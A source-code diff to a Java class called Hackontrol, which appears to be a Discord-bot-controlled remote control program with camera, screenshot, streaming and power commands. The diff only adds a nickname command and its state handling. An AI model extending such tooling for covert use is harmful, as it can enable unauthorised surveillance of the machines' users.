@@ -11,6 +11,7 @@ import com.khopan.hackontrol.command.CameraCommand;
 import com.khopan.hackontrol.command.Command;
 import com.khopan.hackontrol.command.DeviceListCommand;
 import com.khopan.hackontrol.command.HelpCommand;
+import com.khopan.hackontrol.command.NicknameCommand;
 import com.khopan.hackontrol.command.PowerCommand;
 import com.khopan.hackontrol.command.ScreenshotCommand;
 import com.khopan.hackontrol.command.SelectCommand;
@@ -35,6 +36,7 @@ public class Hackontrol {
 	private final CommandDispatcher<CommandSource> dispatcher;
 
 	private boolean selected;
+	private String nickname;
 
 	private Hackontrol(JDA bot, String machineIdentifier) {
 		this.machineIdentifier = machineIdentifier;
@@ -48,6 +50,7 @@ public class Hackontrol {
 		this.registerCommand(new StreamCommand());
 		this.registerCommand(new PowerCommand());
 		this.registerCommand(new CameraCommand());
+		this.registerCommand(new NicknameCommand());
 	}
 
 	private void registerCommand(Command command) {
@@ -102,7 +105,7 @@ public class Hackontrol {
 			return;
 		}
 
-		CommandSource source = new DefaultCommandSource(this.machineIdentifier, channel, () -> this.selected, selected -> this.selected = selected);
+		CommandSource source = new DefaultCommandSource(this.machineIdentifier, channel, () -> this.selected, selected -> this.selected = selected, () -> this.nickname, nickname -> this.nickname = nickname);
 
 		try {
 			this.dispatcher.execute(message, source);
